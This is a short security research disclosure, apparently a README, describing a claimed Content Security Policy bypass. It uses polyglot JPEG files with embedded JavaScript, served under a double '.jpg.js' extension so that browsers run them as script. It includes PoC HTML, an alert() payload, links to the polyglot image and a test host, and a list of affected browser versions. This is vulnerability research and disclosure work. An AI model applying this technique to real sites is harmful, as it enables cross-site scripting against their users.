# Bypass CSP against MIME Confusion Attack

Major browsers have implemented Content Security Policy against MIME confusion attacks since 2018, reported by CVE-2018-5164 and CVE-2019-19916 (my report) which use polyglot image files (GIF, JPG ...) with embedded JavaScript code (as described here: https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/ and here https://github.com/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser).

But based on my studies I found a way to bypass CSP and perform Cross-Site Script (XSS) attacks by exploiting the MIME Type of the HTTP header.


## Proof of concept Step-by-step

CSP's correct behavior in HTTP MIME Type is not to allow an image file with embedded JavaScript code to be read as script, as below the HTML/JS code below:

```
<html>
     <img src="2x.jpg">
	   <script src="2x.jpg"></script>
 </html>
```

I managed to bypass CSP by stating more than one extension in the image file with embedded JavaScript code, like this:

```
<html>
     <img src="2x.jpg.js">
	   <script src="2x.jpg.js"></script>
 </html>
```

So the image continues to be read as script by `<script>` tag and as image by `<img>` tag.

  
The image used as PoC was the one available here: http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg


The inline JavaScript code was this:
```
*/=alert("Burp rocks.")/*
```

The PoC website is hosted at: http://joomla.sejalivre.org/index2.html



## Vulnerable Browsers

This PoC has been tested on the following browsers:

* Mozilla Firefox 71.0 (Windows, Linux and Android)
* Google Chrome 79.0.3945.88 (Windows, Linux and Android)
* Google Chromium 81.0.4003.0 (Windows and Linux)
* Apple Safari 13.0.4 (MacOS Catalina)
* Opera 60 - R3 (Windows and Linux)

## Screenshots

Below are some screenshots of PoC

![alt](https://ciber.sejalivre.org/WP/chrome.png)

![alt](https://ciber.sejalivre.org/WP/chromium.png)

![alt](https://ciber.sejalivre.org/WP/firefox.png)

![alt](https://ciber.sejalivre.org/WP/opera.png)

![alt](https://ciber.sejalivre.org/WP/safari.jpeg)
